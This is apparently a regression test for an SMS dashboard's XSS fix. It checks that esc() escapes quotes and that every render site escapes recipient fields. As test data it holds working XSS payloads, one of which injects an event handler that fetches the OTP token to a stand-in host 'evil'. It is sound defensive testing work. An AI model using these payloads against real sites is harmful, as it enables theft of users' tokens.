/**
 * test/xss.test.js — attacker-controlled fields must not reach the DOM as markup.
 *
 * The hole: canonicalizePhone returns the raw string when it cannot parse a
 * number, so any recipient posted to /sms arrives at the dashboard verbatim. It
 * was then interpolated into <option value="${n}">${n}</option> unescaped, which
 * closes the attribute and injects markup into the dashboard's own origin —
 * where the session token lives.
 *
 * Reaching it needs the API key, which ships inside the APK and is recoverable
 * with `strings`. So "needs the key" is not the same as "needs a secret".
 *
 * =============================================================================
 * WHY THIS FILE NOW RUNS esc() INSTEAD OF ONLY LOOKING FOR IT
 *
 * The earlier version asserted that every render site CALLED esc(), and that
 * was not enough. esc() was `textContent` -> `innerHTML`, which escapes < > &
 * and nothing else — the HTML serialiser only escapes quotes when writing an
 * attribute, and it never knows it is. Its output was placed inside
 * value="..." and data-code="...", so a quote in a recipient still closed the
 * attribute and injected an event handler. < and > were escaped, so the tag
 * could not be closed — an injected ATTRIBUTE needs neither.
 *
 * A test that checks which function was called cannot see that. So esc() is
 * extracted from the file and executed here against the actual payload.
 * =============================================================================
 *
 * Run: node test/xss.test.js
 */

const assert = require('assert');
const fs = require('fs');
const html = fs.readFileSync(__dirname + '/../public/index.html', 'utf8');

// ── Extract a function from the dashboard so it can be run, not just matched ──
function extractFunction(src, name) {
    const start = src.indexOf('function ' + name + '(');
    assert.ok(start >= 0, name + '() not found in the dashboard');
    let depth = 0;
    for (let i = src.indexOf('{', start); i < src.length; i++) {
        if (src[i] === '{') depth++;
        else if (src[i] === '}' && --depth === 0) return src.slice(start, i + 1);
    }
    throw new Error('unbalanced braces in ' + name + '()');
}

// esc() must not depend on the DOM — it is pure string work, and this is what
// lets it be tested at all.
const esc = new Function('return (' + extractFunction(html, 'esc') + ')')();

// ── esc() itself ─────────────────────────────────────────────────────────────
assert.strictEqual(esc('&'), '&amp;', '& must escape');
assert.strictEqual(esc('<img>'), '&lt;img&gt;', '< and > must escape');
assert.strictEqual(esc('"'), '&quot;', 'DOUBLE QUOTE must escape — it is what closes an attribute');
assert.strictEqual(esc("'"), '&#39;', 'single quote must escape');
// & first, or every other replacement gets re-escaped into nonsense.
assert.strictEqual(esc('a&lt;b'), 'a&amp;lt;b', '& must be replaced before the others');
assert.strictEqual(esc(''), '');
assert.strictEqual(esc(null), '', 'null must not render as the text "null"');
assert.strictEqual(esc(undefined), '');
assert.strictEqual(esc(1234), '1234', 'numbers pass through as text');

// The payload that was actually exploitable, through the actual function.
const PAYLOAD = 'x" onmouseover="fetch(\'//evil/\'+localStorage.getotp_token)';
const escaped = esc(PAYLOAD);
assert.ok(!escaped.includes('"'),
    'a quote in a recipient must not survive into an attribute value');
assert.ok(!/<option value="[^"]*"[^>]*\son\w+=/.test(`<option value="${escaped}">`),
    'the escaped recipient must not be able to introduce an event handler');

// ── Every render site still goes through it ──────────────────────────────────
const FIELDS = ['sms.sender', 'sms.recipient', 'sms.message'];
for (const f of FIELDS) {
    const bare = new RegExp('\\$\\{\\s*' + f.replace('.', '\\.') + '\\s*\\}');
    assert.ok(!bare.test(html), `${f} is interpolated without esc()`);
}

// The recipient list — the one that was actually exploitable.
assert.ok(/<option value="\$\{esc\(n\)\}"/.test(html),
    'filter option value must be escaped');
assert.ok(!/<option value="\$\{n\}"/.test(html),
    'unescaped recipient in an option value is the original hole');

// Escaped data still must never land inside inline JS: the JS parser reads
// &#39; as three characters, so escaping does not make it safe there.
assert.ok(!/onclick="[^"]*\$\{esc\(/.test(html),
    'esc() output must not be interpolated into inline JS');
assert.ok(/data-code="\$\{esc\(code\)\}"/.test(html),
    'the code should travel as a data attribute, read by a delegated handler');

// The store must not sanitise on the way in — escaping belongs at render time,
// and pretending otherwise hides the real contract.
const {canonicalizePhone} = require('../lib/phone');
const evil = '"><img src=x onerror=alert(1)>';
assert.strictEqual(canonicalizePhone(evil), evil,
    'canonicalizePhone passes unparseable input through — the renderer must escape');

console.log('ok — esc() escapes quotes, and every render site goes through it');
